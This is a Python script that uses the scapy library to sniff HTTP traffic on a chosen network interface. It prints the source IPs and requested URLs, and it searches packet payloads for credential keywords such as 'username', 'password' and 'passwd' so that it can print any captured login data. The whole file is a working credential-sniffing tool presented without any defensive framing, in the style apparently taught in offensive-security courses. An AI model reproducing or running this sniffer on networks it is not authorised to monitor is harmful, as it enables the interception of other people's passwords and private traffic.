#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff. EX : eth0")
    options = parser.parse_args()
    if not options.interface:
        parser.error("\n[-] Please specify an interface, use --help for more info.")
    return options.interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_ip(packet):
    return packet[scapy.IP].src


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'password', 'uname', 'user', 'login', 'email', 'passwd', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.IP):
            srcip = get_ip(packet)
            print("[+] Source IP : " + srcip)
        url = get_url(packet).decode()
        print("[+] HTTP Request : " + url)
        login_info = get_login(packet)
        if login_info:
            print(f'\n\nPossible password : {login_info}\n\n')


sniff(get_arguments())
